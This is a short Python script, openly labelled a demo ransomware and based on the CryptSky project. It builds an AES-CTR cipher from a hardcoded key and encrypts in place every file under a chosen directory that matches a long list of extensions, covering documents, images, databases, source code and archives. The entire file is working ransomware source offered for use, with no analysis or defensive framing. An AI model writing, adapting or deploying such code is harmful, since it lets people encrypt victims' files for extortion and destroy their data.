#!/usr/bin/env python
#
# based on:
# https://github.com/deadPix3l/CryptSky
#
#

from Crypto.Cipher import AES
from Crypto.Util import Counter

import helper

key = "PAYMESOMERANSOM!".encode()

print(
    "This is a demo ransomware. Basically it only encrypts files from a specific directory. If you accidently encrypted"
    "important files, just run this script again! To really encrypt files, use the -d parameter!\nEncryption Key is: %s\n\n" % (
        str(key)))

# use AES CTR mode
ctr = Counter.new(128)
crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

# change this to fit your needs.
startdirs = "C:\\Temp"
ENCRYPT_EXTENSIONS = "exe,dll,so,rpm,deb,vmlinuz,img,jpg,jpeg,bmp,gif,png,svg,psd,raw,mp3,mp4,m4a,aac,ogg,flac,wav,wma,aiff,ape,avi,flv,m4v,mkv,mov,mpg,mpeg,wmv,swf,3gp,doc,docx,xls,xlsx,ppt,pptx,odt,odp,ods,txt,rtf,tex,pdf,epub,md,yml,yaml,json,xml,csv,db,sql,dbf,mdb,iso,html,htm,xhtml,php,asp,aspx,js,jsp,css,c,cpp,cxx,h,hpp,hxx,java,class,jar,ps,bat,vb,awk,sh,cgi,pl,ada,swift,go,py,pyc,bf,coffee,zip,tar,tgz,bz2,7z,rar,bak".split(",")

for file in helper.discoverFiles(startdirs, ENCRYPT_EXTENSIONS):
    print("Encrypting file %s" % (file))
    try:
        helper.modify_file_inplace(file, crypt.encrypt)
    except Exception as e:
        print("Error encrypting file %s: %s" % (file, e))
